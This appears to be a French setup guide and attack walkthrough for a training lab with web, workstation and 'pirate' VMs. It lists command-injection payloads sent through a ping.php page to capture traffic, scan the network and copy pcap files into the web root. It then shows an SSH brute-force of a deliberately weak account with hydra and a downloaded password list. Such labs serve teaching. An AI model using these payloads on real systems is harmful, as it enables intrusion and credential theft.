## serveurs / VM :

### www : 
- à installer :  
`sudo apt-get update -y`  
`sudo apt-get install -y apache`  
`sudo apt-get install –y php7  ` 
- avec fichier :
    - ping.php 
    - logs.php
### poste :
- à installer :  
`sudo apt-get update -y`    
`sudo apt-get install -y iptables`  
`sudo apt-get install -y openssh-server`



#### pirate :
- À installer :  
`sudo apt-get update -y`    
`sudo apt-get install -y wireshark`  
`sudo apt-get install -y tcpdump`  
- Mais aussi il faut installer ces paquets :
    - ##### partie client FTP :
    `sudo apt-get install -y filezilla`  
    `sudo apt-get install -y ftp`  
    `sudo apt-get install -y sleuthkit`   
    
    - ##### partie client SSH :
    
    `sudo apt-get install -y ssh`  

#### Serveur ftp-pirate :
- À installer :  
`sudo apt-get update -y`    
`sudo apt-get install -y vsftpd` 

#### Serveur ssh-pirate :
- À installer :  
`sudo apt-get update -y`  
`sudo apt-get install -y openssh-server`


#### Serveur cc-pirate :
- À installer :  
`sudo apt-get update -y`  



### depuis www
A6 )

le pirate va sur la page $ip_www/ping.php

```php
; sudo history ; // historique des commandes

; sudo apt-get install -y nmap ; // installation avec yes

; sudo apt-get install tcpdump -y && sudo tcpdump --interface any -c 400  -w data.pcap ;  // s'arrete après 400 paquets

; ip a ; //note l'adresse réseau 192.168.0.56

: nmap -T4 -sP 192.168.0.0/24 | grep for ; // scanne le réseau local de www

// tu notes l'adresse IP qui est différente de www sauf Routeur

; sudo dpkg -l > res.txt && cat res.txt && rm -rf res.txt ; // listes des paquetages installés par rapport à l'indice A6
; sudo dpkg -s | grep "Package" ; // listes des paquetages installés par rapport à l'indice A6


; sudo dpkg -l | grep -i "tcpdump" ; //équiavlent de Wireshark en ligne de commandes s'il est installé alors des fichiers pcap seront générables


; sudo find / -name "*.pcap*" ; // recherche tous les fichiers .pcap lisible avec Wireshark du disque dur // noté les fichiers

 sudo tcpdump -h

-r file



sudo tcpdump -r /home/etudiant/data.pcap // affiche en ligne de commande l'ensemble de la capture réseau du fichier .pcap en gros wireshark juste en ligne de commande
 
//étape optionnelle




; sudo cp `sudo find / -name "*.pcap*"` /var/www/html/ ;


```

A7)

> [!WARNING]
> le pirate va sur la page $ip_www/ping.php
créer lorie sur poste de travail
sudo adduser lorie
rentrer le mot de passe
entrée à tout + y

avec un mot de passe dans la liste des 500 pires mot de passes
```php
; sudo cat auth.log ; // note le nom d'utilisateur du pc poste de travail
; sudo find / -name "auth.log" ; 

// filtrer sur le fichier pour avoir le nom d'utilisateur
; sudo cat auth.log | grep "postedetravail" | cut -f 4 -d ' ' | uniq ;
// bruteforce
; curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt > 500-worst-passwords.txt ;
; hydra -l lorie -P 500-worst-passwords.txt $ip_postedetravail ssh ;





```






liens   :
A6 )
https://www.makeuseof.com/tcpdump-examples/#:~:text=%20The%20tcpdump%20Output%20Format%20%201%20Timestamp,9%20Window%20size%2010%20Packet%20length%20More%20


A7)
https://www.kali-linux.fr/hacking/tutohydrabruteforce